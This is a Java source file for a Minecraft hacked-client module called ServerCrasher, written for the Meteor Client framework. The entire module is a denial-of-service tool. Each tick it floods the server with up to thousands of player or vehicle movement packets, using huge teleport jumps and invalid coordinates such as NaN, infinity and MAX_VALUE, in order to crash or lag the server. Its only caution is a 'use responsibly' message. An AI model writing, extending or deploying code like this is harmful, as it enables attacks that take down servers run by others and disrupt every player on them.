package meteordevelopment.meteorclient.systems.modules.misc;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

public class ServerCrasher extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final SettingGroup sgModes = settings.createGroup("Modes");

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("The method to use for crashing.")
        .defaultValue(Mode.Movement)
        .build()
    );

    private final Setting<Double> distance = sgGeneral.add(new DoubleSetting.Builder()
        .name("distance")
        .description("Distance to teleport per tick.")
        .defaultValue(1000)
        .min(100)
        .sliderRange(100, 100000)
        .build()
    );

    private final Setting<Integer> packetsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick")
        .description("Number of movement packets per tick.")
        .defaultValue(1000)
        .min(1)
        .sliderRange(1, 10000)
        .build()
    );

    private final Setting<Direction> direction = sgGeneral.add(new EnumSetting.Builder<Direction>()
        .name("direction")
        .description("Direction to teleport.")
        .defaultValue(Direction.Forward)
        .build()
    );

    private final Setting<Boolean> randomize = sgGeneral.add(new BoolSetting.Builder()
        .name("randomize")
        .description("Randomize teleport positions.")
        .defaultValue(true)
        .build()
    );

    private final Setting<Boolean> bounds = sgModes.add(new BoolSetting.Builder()
        .name("invalid-bounds")
        .description("Send packets with invalid position bounds.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> infinity = sgModes.add(new BoolSetting.Builder()
        .name("infinity-position")
        .description("Send packets with infinity positions.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> nan = sgModes.add(new BoolSetting.Builder()
        .name("nan-position")
        .description("Send packets with NaN positions.")
        .defaultValue(false)
        .build()
    );

    private int tickCounter = 0;

    public ServerCrasher() {
        super(Categories.Misc, "server-crasher", "Attempts to crash or lag the server using various exploits.");
    }

    @Override
    public void onActivate() {
        tickCounter = 0;
        if (mc.player == null) {
            toggle();
            return;
        }
        info("Starting server crasher - use responsibly!");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        tickCounter++;

        switch (mode.get()) {
            case Movement -> sendMovementPackets();
            case Vehicle -> sendVehiclePackets();
            case Bounds -> sendBoundsPackets();
            case Combined -> {
                sendMovementPackets();
                sendBoundsPackets();
            }
        }
    }

    private void sendMovementPackets() {
        Vec3d pos = mc.player.getPos();
        double dist = distance.get();

        for (int i = 0; i < packetsPerTick.get(); i++) {
            double x, y, z;

            if (infinity.get()) {
                x = Double.POSITIVE_INFINITY;
                y = Double.POSITIVE_INFINITY;
                z = Double.POSITIVE_INFINITY;
            } else if (nan.get()) {
                x = Double.NaN;
                y = Double.NaN;
                z = Double.NaN;
            } else if (bounds.get()) {
                x = 3.0E7 + Math.random() * 1000000;
                y = 1000 + Math.random() * 1000;
                z = 3.0E7 + Math.random() * 1000000;
            } else {
                double offset = randomize.get() ? (Math.random() - 0.5) * dist : dist;
                
                switch (direction.get()) {
                    case Forward -> {
                        double yaw = Math.toRadians(mc.player.getYaw());
                        x = pos.x - Math.sin(yaw) * offset;
                        z = pos.z + Math.cos(yaw) * offset;
                        y = pos.y;
                    }
                    case Up -> {
                        x = pos.x;
                        y = pos.y + offset;
                        z = pos.z;
                    }
                    case Random -> {
                        x = pos.x + (Math.random() - 0.5) * dist * 2;
                        y = pos.y + (Math.random() - 0.5) * dist;
                        z = pos.z + (Math.random() - 0.5) * dist * 2;
                    }
                    case Spiral -> {
                        double angle = tickCounter * 0.1 + i * 0.01;
                        x = pos.x + Math.cos(angle) * dist;
                        y = pos.y + (tickCounter % 100);
                        z = pos.z + Math.sin(angle) * dist;
                    }
                    default -> {
                        x = pos.x + offset;
                        y = pos.y;
                        z = pos.z + offset;
                    }
                }
            }

            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(x, y, z, false, mc.player.horizontalCollision));
        }
    }

    private void sendVehiclePackets() {
        if (mc.player.getVehicle() == null) return;

        Vec3d pos = mc.player.getVehicle().getPos();
        double dist = distance.get();

        for (int i = 0; i < packetsPerTick.get(); i++) {
            double x = pos.x + (randomize.get() ? (Math.random() - 0.5) * dist * 2 : dist);
            double y = pos.y + (Math.random() - 0.5) * 100;
            double z = pos.z + (randomize.get() ? (Math.random() - 0.5) * dist * 2 : dist);

            mc.player.getVehicle().setPos(x, y, z);
            mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(mc.player.getVehicle()));
        }
    }

    private void sendBoundsPackets() {
        double[] invalidValues = {
            Double.MAX_VALUE,
            -Double.MAX_VALUE,
            Double.POSITIVE_INFINITY,
            Double.NEGATIVE_INFINITY,
            Double.NaN,
            3.0E8,
            -3.0E8,
            Float.MAX_VALUE,
            -Float.MAX_VALUE
        };

        for (int i = 0; i < packetsPerTick.get() / 10; i++) {
            double x = invalidValues[(int) (Math.random() * invalidValues.length)];
            double y = invalidValues[(int) (Math.random() * invalidValues.length)];
            double z = invalidValues[(int) (Math.random() * invalidValues.length)];

            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(x, y, z, false, false));
        }
    }

    @Override
    public String getInfoString() {
        return mode.get().name();
    }

    public enum Mode {
        Movement,
        Vehicle,
        Bounds,
        Combined
    }

    public enum Direction {
        Forward,
        Up,
        Random,
        Spiral
    }
}
